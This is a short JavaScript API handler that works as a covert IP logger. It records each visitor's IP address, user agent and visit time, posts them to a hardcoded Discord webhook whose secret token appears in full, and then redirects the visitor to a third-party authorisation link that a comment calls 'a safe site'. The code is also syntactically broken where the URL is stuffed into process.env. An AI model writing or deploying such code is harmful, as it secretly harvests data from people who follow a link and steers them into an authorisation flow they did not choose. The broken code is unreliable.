// /api/track.js

export default async function handler(req, res) {
  // Grab IP and User Agent
  const ip =
    req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress;
  const userAgent = req.headers["user-agent"];
  const time = new Date().toISOString();

  // Build webhook message
  const message = {
    content: `🟢 New visit:
- IP: ${ip}
- User-Agent: ${userAgent}
- Time: ${time}`,
  };

  // Send to your Discord webhook
  await fetch(process.env.https://discord.com/api/webhooks/1412081122048741426/NWsChKO7PqLPxXKhjG0j6gyqzFQOv1Wvby8soi0UGKHkQjkF_6bMGvB3sn6iVsudusVg, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(message),
  });

  // Redirect to a safe site
  res.writeHead(302, { Location: "https://vaultcord.win/auth?code=Qny22hAgdUP37hC8FOsrFfIhYEZ07t&state=58619" });
  res.end();
}
